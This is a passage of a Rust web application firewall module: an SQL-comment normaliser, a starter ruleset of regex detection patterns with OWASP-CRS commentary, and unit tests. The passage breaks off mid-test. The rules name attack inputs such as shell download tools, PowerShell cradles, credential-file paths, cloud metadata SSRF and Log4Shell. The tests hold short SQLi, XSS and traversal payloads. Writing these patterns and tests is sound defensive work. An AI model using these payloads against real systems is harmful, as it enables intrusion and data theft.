			if b.get(i + 2) == Some(&b'!') {
				// MySQL executable comment: drop `/*!` and any version digits, keep the payload.
				i += 3;
				while i < b.len() && b[i].is_ascii_digit() {
					i += 1;
				}
				out.push(b' ');
			} else {
				// Ordinary block comment: elide the whole `/* … */` to one separator space.
				i += 2;
				while i + 1 < b.len() && !(b[i] == b'*' && b[i + 1] == b'/') {
					i += 1;
				}
				i = (i + 2).min(b.len());
				out.push(b' ');
			}
			continue;
		}
		// Closing delimiter of an executable comment whose opener was already elided.
		if b[i] == b'*' && b.get(i + 1) == Some(&b'/') {
			out.push(b' ');
			i += 2;
			continue;
		}
		out.push(b[i]);
		i += 1;
	}
	// Collapse runs of ASCII whitespace to a single space, then trim the ends.
	let text = String::from_utf8_lossy(&out);
	let mut collapsed = String::with_capacity(text.len());
	let mut in_ws = false;
	for ch in text.chars() {
		if ch.is_ascii_whitespace() {
			if !in_ws {
				collapsed.push(' ');
				in_ws = true;
			}
		} else {
			collapsed.push(ch);
			in_ws = false;
		}
	}
	collapsed.trim().to_owned()
}

/// The numeric value of a single hex digit, or `None` if `b` is not `[0-9A-Fa-f]`.
const fn hex_val(b: u8) -> Option<u8> {
	match b {
		b'0'..=b'9' => Some(b - b'0'),
		b'a'..=b'f' => Some(b - b'a' + 10),
		b'A'..=b'F' => Some(b - b'A' + 10),
		_ => None,
	}
}

/// The built-in starter ruleset: a small, curated set of high-signal patterns across
/// the classic classes. Deliberately conservative to keep false positives low; extend
/// it via [`Waf::new`] for fuller coverage. Patterns are case-insensitive where case
/// does not matter to the attack.
#[must_use]
pub fn starter_rules() -> Vec<Rule> {
	vec![
		// --- SQL injection ---
		Rule { id: "sqli_union_select", category: WafCategory::Sqli, pattern: r"(?i)\bunion\b[\s\S]{0,40}\bselect\b" },
		Rule { id: "sqli_or_tautology", category: WafCategory::Sqli, pattern: r#"(?i)\bor\b\s+['"]?\s*\d+\s*=\s*\d+"# },
		Rule { id: "sqli_stacked_query", category: WafCategory::Sqli, pattern: r"(?i);\s*(drop|delete|update|insert|truncate)\b" },
		Rule { id: "sqli_comment", category: WafCategory::Sqli, pattern: r"(--\s|#|/\*)[\s\S]*?(\bor\b|\band\b|=)" },
		Rule { id: "sqli_time_based", category: WafCategory::Sqli, pattern: r"(?i)\b(sleep|benchmark|pg_sleep|waitfor\s+delay)\s*\(" },
		Rule { id: "sqli_information_schema", category: WafCategory::Sqli, pattern: r"(?i)\binformation_schema\b" },
		Rule { id: "sqli_into_outfile", category: WafCategory::Sqli, pattern: r"(?i)\binto\s+(out|dump)file\b" },
		// MySQL privilege-escalation / file-read SQL beyond the `INTO OUTFILE` write and the `load_file`
		// read already covered (OWASP-CRS rules 942151/942320 + 942480): `PROCEDURE ANALYSE` (the
		// info-leak/version-probe MySQL appends to a query) and `LOAD DATA … INFILE` (the server-side
		// file read that `sqli_into_outfile` — write-only — and `sqli_oob_exec`'s `load_file` both miss).
		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
		Rule { id: "sqli_privilege_functions", category: WafCategory::Sqli, pattern: r"(?i)(\bprocedure\s+analyse\b|\bload\s+data\b[\s\S]{0,40}\binfile\b)" },
		// Boolean-based blind SQLi beyond `or N=N` (which `sqli_or_tautology` already covers):
		// `and` with any comparator, or `or` with `<`/`>`. Deliberately excludes `or N=N` so it
		// does not double-count against `sqli_or_tautology` in anomaly scoring.
		Rule { id: "sqli_boolean_condition", category: WafCategory::Sqli, pattern: r#"(?i)(\band\b\s+['"]?\d+\s*[=<>]|\bor\b\s+['"]?\d+\s*[<>])\s*['"]?\d+"# },
		Rule { id: "sqli_oob_exec", category: WafCategory::Sqli, pattern: r"(?i)\b(xp_cmdshell|xp_dirtree|load_file|utl_http|dbms_ldap)\b" },
		// Quote-wrapped string tautology (OWASP-CRS 4.28.0 quote-evasion audit) — the classic
		// `' OR 'a'='a` / `" AND "x"="x` auth-bypass the numeric `sqli_or_tautology` misses because
		// the equality is between two *quoted strings*, not digits. Keyed on the quote →
		// `or`/`and` → quote → `<value>` → quote → `=` → quote shape; the trailing `=` between
		// quoted operands is the false-positive guard, so benign `'red' or 'blue'` phrasing (no
		// quoted equality) stays clean.
		// <https://www.linuxcompatible.org/story/owasp-crs-v4280-drops-with-critical-security-fixes-and-first-lts-track>
		Rule { id: "sqli_string_tautology", category: WafCategory::Sqli, pattern: r#"(?i)['"]\s*\b(or|and)\b\s*['"][^'"]{0,64}['"]\s*=\s*['"]"# },
		// --- Cross-site scripting ---
		Rule { id: "xss_script_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*script\b" },
		Rule { id: "xss_js_uri", category: WafCategory::Xss, pattern: r"(?i)javascript:" },
		Rule { id: "xss_event_handler", category: WafCategory::Xss, pattern: r"(?i)\bon(error|load|click|mouseover|focus|toggle)\s*=" },
		Rule { id: "xss_iframe_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*iframe\b" },
		Rule { id: "xss_data_html_uri", category: WafCategory::Xss, pattern: r"(?i)data:text/html" },
		Rule { id: "xss_vbscript_uri", category: WafCategory::Xss, pattern: r"(?i)vbscript:" },
		Rule { id: "xss_svg_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*svg\b" },
		// Dangerous HTML tags past the script/iframe/svg trio (OWASP-CRS rule 941320 tag-handler port):
		// plugin/resource loaders and layout-legacy elements that execute script or exfiltrate on their
		// own — `<object>`/`<embed>`/`<applet>` (plugin content), `<base>` (base-href hijack redirects
		// every relative URL), `<bgsound>`/`<marquee>`/`<layer>` (legacy auto-fire), `<frame>`/`<frameset>`
		// (framing injection), `<isindex>`, and `<math>` (MathML XSS). Left `<form>`/`<meta>`/`<link>`/
		// `<style>` out — they show up in benign rich-text often enough to raise false positives. An
		// opening `<tag` in a request parameter is near-always an injection attempt. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf>
		Rule { id: "xss_dangerous_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*(object|embed|applet|marquee|base|bgsound|layer|frame(set)?|isindex|math)\b" },
		// HTML5 XSS vectors the small handler set above misses (OWASP-CRS 941 port). Newer event
		// handlers are the go-to bypass when the classic `onerror`/`onload` list is filtered:
		// animation/transition/pointer events and the popover `onbeforetoggle` all auto-fire.
		Rule { id: "xss_html5_event_handler", category: WafCategory::Xss, pattern: r"(?i)\bon(animation(start|end|iteration)|transitionend|pointer(over|down|enter|rawupdate)|beforetoggle|beforeprint|pageshow|hashchange|wheel)\s*=" },
		// Injection-only attributes: an iframe `srcdoc` carrying inline markup, and a `formaction`
		// that hijacks a form's submit target. Reflected into a response these are near-always an
		// XSS vector; an operator legitimately reflecting them can disable this rule.
		Rule { id: "xss_dangerous_attribute", category: WafCategory::Xss, pattern: r"(?i)\b(srcdoc|formaction)\s*=" },
		// --- Path / directory traversal & file-inclusion wrappers ---
		Rule { id: "traversal_dotdot", category: WafCategory::PathTraversal, pattern: r"(\.\./|\.\.\\)" },
		Rule { id: "traversal_encoded", category: WafCategory::PathTraversal, pattern: r"(?i)%2e%2e(%2f|%5c|/|\\)" },
		Rule { id: "traversal_sensitive_file", category: WafCategory::PathTraversal, pattern: r"(?i)(/etc/passwd|/etc/shadow|boot\.ini|win\.ini)" },
		Rule { id: "traversal_proc_self", category: WafCategory::PathTraversal, pattern: r"(?i)/proc/self/(environ|cmdline|fd|maps)" },
		// Container / app-server internal artifacts exposed by a traversal or a misrouted
		// request (OWASP-CRS 4.26.0 restricted-files growth): the Docker container marker,
		// the macOS directory-metadata file, the Java servlet `META-INF/`/`WEB-INF/` internals,
		// and — prefix-guarded so `/settings/profile` and `user.profile` stay clean — a
		// dot-segment `.profile` shell startup file. <https://www.linuxcompatible.org/story/owasp-crs-4260-released>
		Rule { id: "traversal_appserver_files", category: WafCategory::PathTraversal, pattern: r"(?i)(/\.dockerenv\b|/\.ds_store\b|/(meta-inf|web-inf)/|/\.profile\b)" },
		// Version-control metadata, framework dotfile configs, and secrets files probed over
		// HTTP (OWASP-CRS restricted-files access, `RESTRICTED_FILES` / rule 930130): a `.git/`
		// tree leak, an Apache `.htaccess`/`.htpasswd`, an IIS `web.config`, or the classic
		// `/.env` secrets grab. Dot-segment/enclosing-slash anchored so `/.environment` and
		// `/settings/gitignore-help` stay clean.
		Rule { id: "traversal_vcs_config_files", category: WafCategory::PathTraversal, pattern: r"(?i)(/\.git/|/\.svn/|/\.hg/|/\.bzr/|/\.env\b|/\.htaccess\b|/\.htpasswd\b|/\.gitignore\b|/web\.config\b)" },
		// Editor/database backup & swap artifacts left in the webroot — a `config.php.bak`, a
		// SQL dump, a vim `.swp`. High-signal source/secret disclosure; an operator serving such
		// files deliberately can `disable_rule("traversal_backup_files")`.
		Rule { id: "traversal_backup_files", category: WafCategory::PathTraversal, pattern: r"(?i)\.(bak|swp|swo|sql|dump)\b" },
		// AI coding-assistant artifact directories probed over HTTP (OWASP-CRS rule 930140, added
		// 4.24.1 via issue #4474 — the `ai-critical-artifacts.data` `@pmFromFile` set). These
		// per-tool dotdirs hold MCP server definitions, project rules, hooks, and — the real prize
		// for a scanner — API keys / tokens in env or `settings.local.json` (`.claude/`, `.cursor/`,
		// Codex `.codex/`, Windsurf `.windsurf/`, Agent Zero `.a0proj/secrets.env`, …). Enclosing-slash
		// / dot-segment anchored like the VCS-config rule so `/declared/` and `x.cursor` stay clean;
		// `.qwen_code` and `.crush` ship without a trailing slash in the CRS data file, so they take a
		// word-boundary tail instead. <https://github.com/coreruleset/coreruleset/blob/main/rules/ai-critical-artifacts.data>
		Rule { id: "traversal_ai_assistant_artifacts", category: WafCategory::PathTraversal, pattern: r"(?i)(/\.(claude|cursor|continue|aider|roo|zed|cline|kiro|windsurf|rovodev|codex|opencode|a0proj|plandex|fabric|n8n|junie|gemini|openclaw|clawdbot|trustclaw|zeroclaw|warp)/|/\.(qwen_code|crush)\b)" },
		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob)://" },
		// --- OS command injection ---
		Rule { id: "cmdi_shell_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(cat|ls|id|whoami|uname|wget|curl|ncat|nc|bash|sh|python|perl|powershell|cmd)\b" },
		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
		Rule { id: "cmdi_command_substitution", category: WafCategory::CommandInjection, pattern: r"(?i)\$\(\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|env|echo|printf)\b" },
		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
		// aliased call form (`iex(`), the `Net.WebClient().DownloadString` / `Invoke-WebRequest`
		// fileless download cradle, `[Convert]::FromBase64String`, and the `-EncodedCommand`/`-nop`/
		// `-w hidden` launcher flags that ride a base64 blob. Anchored on PowerShell-specific idioms so
		// prose that merely says "invoke" or "hidden" stays clean. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
		Rule { id: "cmdi_powershell", category: WafCategory::CommandInjection, pattern: r"(?i)(invoke-expression|invoke-webrequest|invoke-restmethod|downloadstring|downloadfile|net\.webclient|frombase64string|\biex\s*\(|-encodedcommand\b|-enc\b|-nop\b|-noprofile\b|-w\s+hidden|-windowstyle\s+hidden)" },
		// Unix `$IFS` whitespace-evasion (OWASP-CRS rules 932130/932200): the internal-field-separator
		// substitution attackers use to smuggle a space-free command past filters that key on literal
		// whitespace — `cat${IFS}/etc/passwd`, `wget$IFS$9http://…`. Matches the `$IFS` / `${IFS}`
		// token itself; the `\b` tail keeps `$IFSomething` and a benign `${IF}` conditional clean.
		// The `${IFS}` sequence does not occur in ordinary HTTP. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
		Rule { id: "cmdi_ifs_evasion", category: WafCategory::CommandInjection, pattern: r"\$\{?IFS\b" },
		// Shell fork-bomb resource-exhaustion payload (OWASP-CRS 4.25.0 LTS, PL2) — the classic
		// `:(){ :|:& };:`. Keyed on the recursive self-pipe-into-background `:|:&` rather than the
		// `(){` function-definition head, so it is a distinct signal from `anomaly_shellshock`'s
		// `() {` (a fork bomb trips both, honestly — the recursion and the function def are two
		// separate anomalies). The colon-pipe-colon-ampersand sequence does not occur in benign
		// HTTP, so no extra guard is needed. <https://www.linuxcompatible.org/story/owasp-crs-4250-lts-and-339-released/>
		Rule { id: "cmdi_fork_bomb", category: WafCategory::CommandInjection, pattern: r":\s*\|\s*:\s*&" },
		// --- Server-side request forgery (URL-value inspection; no client IP needed) ---
		Rule { id: "ssrf_cloud_metadata_ip", category: WafCategory::Ssrf, pattern: r"169\.254\.169\.254" },
		Rule { id: "ssrf_cloud_metadata_path", category: WafCategory::Ssrf, pattern: r"(?i)/(latest/meta-data|computeMetadata/v1|metadata/instance)\b" },
		Rule { id: "ssrf_internal_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(gopher|dict|file)://" },
		Rule { id: "ssrf_loopback_url", category: WafCategory::Ssrf, pattern: r"(?i)\b(https?|ftp)://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])" },
		Rule { id: "ssrf_decimal_ip", category: WafCategory::Ssrf, pattern: r"(?i)\bhttps?://\d{8,10}(?:[:/]|\b)" },
		// Obfuscated-loopback SSRF: the classic WAF-bypass encodings of 127.0.0.1 that the
		// literal `ssrf_loopback_url` rule misses — hex host (`0x7f000001` / `0x7f.0.0.1`),
		// octal host (`0177.0.0.1` / packed `017700000001`), and the IPv4-mapped IPv6 form
		// (`[::ffff:127.0.0.1]`). Decimal (`2130706433`) is already caught by `ssrf_decimal_ip`.
		Rule { id: "ssrf_obfuscated_loopback", category: WafCategory::Ssrf, pattern: r"(?i)://(0x0*7f[0-9a-f]{0,6}|0177[.0-7]|017700000001|\[::ffff:127\.0\.0\.1\])" },
		// Cloud metadata reachable by DNS name rather than the 169.254.169.254 link-local IP —
		// GCP's `metadata.google.internal`. A value-inspection SSRF target the IP/path rules miss.
		Rule { id: "ssrf_metadata_hostname", category: WafCategory::Ssrf, pattern: r"(?i)\bmetadata\.google\.internal\b" },
		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
		Rule { id: "code_ssti_template", category: WafCategory::CodeInjection, pattern: r"\{\{\s*\d+\s*[*]\s*\d+\s*\}\}" },
		// Server-side template-injection arithmetic probes across more engines than the `${}`/`{{}}`
		// pair above — the `N*N` polyglot tplmap uses to fingerprint an SSTI-to-RCE sink: ERB/EJS/ASP
		// `<%= 7*7 %>`, Ruby/Pug/Slim `#{7*7}`, Razor `@(7*7)`, and Thymeleaf `*{7*7}`. Requiring
		// digit-times-digit *inside* the engine delimiters keeps false positives near zero (a CSS
		// `#{$var}` interpolation or an email `@(handle)` carries no `\d+\*\d+`).
		Rule { id: "code_ssti_erb", category: WafCategory::CodeInjection, pattern: r"<%[=\-]?\s*\d+\s*[*]\s*\d+\s*[-]?%>" },
		Rule { id: "code_ssti_hash_delim", category: WafCategory::CodeInjection, pattern: r"#\{\s*\d+\s*[*]\s*\d+\s*\}" },
		Rule { id: "code_ssti_razor", category: WafCategory::CodeInjection, pattern: r"@\(\s*\d+\s*[*]\s*\d+\s*\)" },
		Rule { id: "code_ssti_thymeleaf", category: WafCategory::CodeInjection, pattern: r"\*\{\s*\d+\s*[*]\s*\d+\s*\}" },
		// Java serialized-object stream smuggled base64 through a text field (cookie/header/body) — the
		// delivery vehicle for a Commons-Collections-style gadget chain. `rO0AB…` is the base64 opener
		// of the raw `\xac\xed\x00\x05` STREAM_MAGIC header (the raw bytes rarely survive as valid UTF-8
		// in a string field, so the base64 form is the one that appears). Broadened to the `KztAAU` /
		// `Cs7QAF` gzip/variant openers OWASP-CRS rule 944210 lists alongside the raw one. Case-SENSITIVE
		// (base64 is) — the exact openers do not occur in benign text. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf>
		Rule { id: "code_java_serialized", category: WafCategory::CodeInjection, pattern: r"(?:rO0AB[A-Za-z0-9+/=]{2,}|KztAAU|Cs7QAF)" },
		// Double-extension upload filename (the file-upload RCE vector behind CVE-2026-33691): a
		// benign-looking media/document/archive extension immediately followed by a *trailing*
		// server-script extension — `avatar.jpg.php`, `report.pdf.jsp`, `notes.txt.phtml`. The
		// `\s*` between the two dots is whitespace-tolerant to catch the padding evasion. Requiring
		// the script extension to trail a recognized benign extension is the false-positive guard:
		// ordinary two-part names like `archive.tar.gz`, `photo.jpg.webp`, or `data.csv.zip` never
		// end in an executable extension. <https://www.linuxcompatible.org/story/owasp-crs-4250-lts-and-339-released/>
		Rule { id: "code_double_extension_upload", category: WafCategory::CodeInjection, pattern: r"(?i)\.(jpe?g|png|gif|bmp|webp|pdf|txt|docx?|xlsx?|csv|zip|gz|rar|html?)\s*\.(php[0-9]?|phtml|phar|jspx?|aspx?|cgi|pl|py|sh|exe|bat|cmd)\b" },
		// PHP code injection (OWASP-CRS 933xxx port): an injected `<?php` / `<?=` open tag, a PHP
		// superglobal reference (`$_GET`/`$_POST`/`$_REQUEST`/…) smuggled into input, and the
		// PHP-specific command-exec / info-leak functions. Kept to PHP-unambiguous tokens
		// (the open tag requires `php`/`=` so an XML `<?` processing instruction stays clean;
		// the funcs are PHP-only names, not the generic `system`/`eval` shared with other langs)
		// so false positives stay low. <https://coreruleset.org/>
		Rule { id: "code_php_open_tag", category: WafCategory::CodeInjection, pattern: r"(?i)<\?(php|=)" },
		Rule { id: "code_php_superglobal", category: WafCategory::CodeInjection, pattern: r"(?i)\$_(get|post|request|server|cookie|session|env|files)\b" },
		Rule { id: "code_php_dangerous_call", category: WafCategory::CodeInjection, pattern: r"(?i)\b(phpinfo|shell_exec|passthru|proc_open|pcntl_exec|base64_decode)\s*\(" },
		// Java / JVM code execution (OWASP-CRS 944xxx port): the `Runtime.getRuntime().exec(...)`
		// idiom and `new ProcessBuilder(...)`, the two canonical JVM process-spawn gadgets that
		// deserialization and OGNL/SpEL payloads reach for. Anchored on the fully-qualified Java
		// idioms (not a bare `.exec(`, which JS regexes also use) to keep false positives low.
		Rule { id: "code_java_runtime_exec", category: WafCategory::CodeInjection, pattern: r"(?i)(runtime\s*\.\s*getruntime\s*\(\s*\)|new\s+processbuilder\b)" },
		// Node.js command execution (OWASP-CRS 934/node port): pulling in `child_process` or
		// calling its exec/spawn family — the standard Node RCE sink behind prototype-pollution
		// and template-injection chains. Keyed on the module require plus the `child_process.<fn>`
		// call form, both Node-specific, so ordinary prose stays clean.
		Rule { id: "code_node_child_process", category: WafCategory::CodeInjection, pattern: r#"(?i)(require\s*\(\s*['"]child_process['"]|child_process\s*\.\s*(exec|execsync|spawn|spawnsync|fork))"# },
		// JavaScript prototype pollution (OWASP-CRS rule 934130, CRITICAL/PL1): the `__proto__`
		// sentinel key and the `constructor.prototype` / `constructor[prototype]` chained-access
		// forms an attacker smuggles through a query/body parameter to poison `Object.prototype` —
		// the entry gadget for many Node RCE chains that then reach `code_node_child_process`.
		// Faithful port of CRS's `__proto__|constructor[\s\x0b]*(?:\.|\]?\[)[\s\x0b]*prototype`
		// (Rust `\s` already covers the vertical-tab CRS spells out); the `\]?\[` limb catches the
		// `obj[constructor][prototype]` bracket-chain the dotted form misses. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf>
		Rule { id: "code_prototype_pollution", category: WafCategory::CodeInjection, pattern: r"(?i)(__proto__|constructor\s*(?:\.|\]?\[)\s*prototype)" },
		// Spring4Shell class-loader manipulation (OWASP-CRS rule 944260, CVE-2022-22965): a data-binding
		// payload walking `class.module.classLoader...` to rewrite the Tomcat access-log pattern into a
		// webshell, plus the `springframework.context.support.FileSystemXmlApplicationContext` SpEL
		// gadget. Keyed on the invariant `class.module.classloader` head rather than CRS's exact
		// `.resources.context.parent.pipeline` tail (attackers vary the tail) — the head never occurs in
		// benign HTTP. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf>
		Rule { id: "code_spring4shell", category: WafCategory::CodeInjection, pattern: r"(?i)(class\.module\.classloader|springframework\.context\.support\.filesystemxmlapplicationcontext)" },
		// --- NoSQL injection (MongoDB query-operator smuggling; value inspection, no client IP) ---
		Rule { id: "nosqli_mongo_where", category: WafCategory::NoSqlInjection, pattern: r"(?i)\$where\b" },
		Rule { id: "nosqli_param_operator", category: WafCategory::NoSqlInjection, pattern: r"(?i)\[\$(ne|eq|gt|gte|lt|lte|in|nin|regex|exists|not|or|nor|and|where)\]" },
		Rule { id: "nosqli_json_operator", category: WafCategory::NoSqlInjection, pattern: r#"(?i)[{,]\s*"\$(ne|gt|gte|lt|lte|in|nin|regex|exists|where|expr|or|nor|and|not)"\s*:"# },
		// ORM lookup-operator injection (OWASP-CRS 4.28.0) — Django/SQLAlchemy double-underscore
		// query lookups used for blind data extraction: `?user__password__startswith=a`, and the
		// `__contains`/`__regex`/`__gt` comparison family. The ORM analog of the Mongo `[$ne]` rule:
		// a `__`-prefixed lookup keyword immediately before the `=` marks a query key exploiting the
		// ORM's filter DSL rather than an ordinary field. The `__` prefix plus the anchored `=` is
		// the false-positive guard — a benign `field=value` never carries a `__lookup=` suffix.
		// <https://www.linuxcompatible.org/story/owasp-crs-v4280-drops-with-critical-security-fixes-and-first-lts-track>
		Rule { id: "nosqli_orm_lookup", category: WafCategory::NoSqlInjection, pattern: r"(?i)__(i?startswith|i?endswith|i?contains|iexact|i?regex|isnull|gte?|lte?)\s*=" },
		// --- LDAP injection (search-filter break-out; value inspection, no client IP) ---
		Rule { id: "ldapi_filter_break", category: WafCategory::LdapInjection, pattern: r"\)\s*\(\s*[|&!]" },
		Rule { id: "ldapi_wildcard_break", category: WafCategory::LdapInjection, pattern: r"[*]\s*\)\s*\(" },
		Rule { id: "ldapi_bool_group", category: WafCategory::LdapInjection, pattern: r"(?i)\(\s*[|&]\s*\(\s*\w+\s*=" },
		// --- XML external entity (markup inspection; no client IP; HTML doctypes excluded) ---
		Rule { id: "xxe_entity_decl", category: WafCategory::Xxe, pattern: r"(?i)<!entity\b" },
		Rule { id: "xxe_entity_external", category: WafCategory::Xxe, pattern: r"(?i)<!entity[\s\S]{0,200}\b(system|public)\b" },
		Rule { id: "xxe_doctype_dtd", category: WafCategory::Xxe, pattern: r"(?i)<!doctype[\s\S]{0,200}\[" },
		// --- Protocol anomalies ---
		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
		Rule { id: "anomaly_shellshock", category: WafCategory::ProtocolAnomaly, pattern: r"\(\)\s*\{" },
		// --- Security-scanner / attack-tool fingerprints (OWASP-CRS 913xxx port) ---
		// A self-identifying offensive tool, keyed on its `name/version` token (the form a tool's
		// `User-Agent` carries). Requiring the trailing `/` is the false-positive guard: prose that
		// merely *mentions* a tool (`/docs/sqlmap-guide`, `?q=how+to+use+wpscan`) lacks the version
		// slash, so it stays clean, while a real `sqlmap/1.7`, `Nikto/2.1.6`, `ghauri/1.x`,
		// `WhatWAF/…` UA trips. ghauri + WhatWAF are the CRS 4.26.0 additions.
		// <https://www.linuxcompatible.org/story/owasp-crs-4260-released>
		Rule { id: "scanner_security_tool", category: WafCategory::ScannerDetection, pattern: r"(?i)\b(sqlmap|nikto|ghauri|whatwaf|nuclei|wpscan|dirbuster|gobuster|feroxbuster|acunetix|netsparker|nessus|arachni|w3af|masscan|zgrab|zmap|jaeles|commix|xsser|wfuzz)/" },
		// Nmap's HTTP probe (NSE) carries a distinctive multi-word phrase rather than a `name/`
		// version token, so it gets its own signature.
		Rule { id: "scanner_nmap_nse", category: WafCategory::ScannerDetection, pattern: r"(?i)nmap scripting engine" },
	]
}

#[cfg(test)]
mod tests {
	use axum::http::Request;

	use super::*;

	fn parts(method: &str, uri: &str) -> Parts {
		Request::builder().method(method).uri(uri).body(()).unwrap().into_parts().0
	}

	fn blocked(v: &Verdict) -> &WafMatch {
		match v {
			Verdict::Block(m) => m,
			Verdict::Allow => panic!("expected Block, got Allow"),
		}
	}

	#[test]
	fn starter_rules_compile() {
		let waf = Waf::starter();
		assert_eq!(waf.rule_count(), starter_rules().len());
	}

	#[test]
	fn benign_request_is_allowed() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/articles/hello-world?page=2")), Verdict::Allow);
	}

	#[test]
	fn sqli_union_select_is_blocked() {
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/items?id=1%20UNION%20SELECT%20password%20FROM%20users"));
		// path_and_query keeps percent-encoding, so test the decoded form via inspect_str too.
		assert_eq!(waf.inspect_str("1 UNION SELECT password FROM users", "target").map(|m| m.category), Some(WafCategory::Sqli));
		// The raw target also trips union..select since spaces are %20 (matched by [\s\S]).
		let _ = v; // raw-encoded form is exercised by inspect_str above
	}

	#[test]
	fn sqli_in_decoded_query_is_blocked() {
		let waf = Waf::starter();
		let m = waf.inspect_str("name=x' OR 1=1 --", "target").unwrap();
		assert_eq!(m.category, WafCategory::Sqli);
	}

	#[test]
	fn sqli_string_tautology_is_blocked() {
		// The quote-wrapped string tautology the numeric `sqli_or_tautology` misses (OWASP-CRS
		// 4.28.0 quote-evasion): `' OR 'a'='a`, `" AND "x"="x`, spacing-tolerant.
		let waf = Waf::starter();
		for payload in ["name=admin' OR 'a'='a", r#"u=x" AND "1"="1"#, "p=' or '1' = '1"] {
			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip a SQLi rule"));
			assert_eq!(m.rule_id, "sqli_string_tautology", "{payload}");
			assert_eq!(m.category, WafCategory::Sqli);
		}
	}

	#[test]
	fn sqli_string_tautology_keeps_false_positives_low() {
		// Quoted prose with `or`/`and` but no quoted-equality stays clean — the trailing `='` is
		// the guard.
		let waf = Waf::starter();
		for uri in [
			"/search?q=red+or+blue",
			"/filter?tags=cats+and+dogs",
			"/quotes?text=to+be+or+not+to+be",
		] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn xss_script_tag_is_blocked() {
		let waf = Waf::starter();
		let m = waf.inspect_str("<script>alert(1)</script>", "target").unwrap();
		assert_eq!(m.category, WafCategory::Xss);
		assert_eq!(m.rule_id, "xss_script_tag");
	}

	#[test]
	fn path_traversal_is_blocked() {
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/files/../../etc/passwd"));
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::PathTraversal);
		assert_eq!(m.location, "target");
	}

	#[test]
	fn malicious_header_value_is_blocked() {
		let waf = Waf::starter();
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::Xss);
		assert_eq!(m.location, "header:user-agent");
	}

	#[test]
	fn custom_rule_extends_detection() {
		// An operator adds a rule on top of the starter set.
		let custom = Rule { id: "block_admin", category: WafCategory::ProtocolAnomaly, pattern: r"(?i)/wp-admin" };
		let waf = Waf::new(starter_rules().into_iter().chain([custom])).unwrap();
		let v = waf.inspect(&parts("GET", "/wp-admin/login.php"));
		assert_eq!(blocked(&v).rule_id, "block_admin");
	}

	#[test]
	fn invalid_custom_pattern_errors() {
		let bad = Rule { id: "bad", category: WafCategory::Sqli, pattern: r"(" };
		assert!(Waf::new([bad]).is_err());
	}

	#[test]
	fn lowest_rule_index_wins_for_determinism() {
		// A string matching two rules reports the lower-indexed (earlier) rule.
		let waf = Waf::starter();
		// "javascript:" (xss_js_uri) plus an event handler; xss_js_uri sits earlier.
		let m = waf.inspect_str("javascript:void(0) onerror=1", "target").unwrap();
		assert_eq!(m.rule_id, "xss_js_uri");
	}

	#[test]
	fn category_names_are_stable() {
		assert_eq!(WafCategory::Sqli.name(), "sqli");
		assert_eq!(WafCategory::PathTraversal.name(), "path_traversal");
		assert_eq!(WafCategory::CommandInjection.name(), "command_injection");
		assert_eq!(WafCategory::ProtocolAnomaly.name(), "protocol_anomaly");
	}

	#[test]
	fn extended_sqli_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("id=1 AND SLEEP(5)", "target").unwrap().rule_id, "sqli_time_based");
		assert_eq!(waf.inspect_str("UNION SELECT table_name FROM information_schema.tables", "target").map(|m| m.category), Some(WafCategory::Sqli));
	}

	#[test]
	fn sqli_privilege_functions_match() {
		// OWASP-CRS 942151/942320 + 942480: PROCEDURE ANALYSE and LOAD DATA INFILE, the file-read /
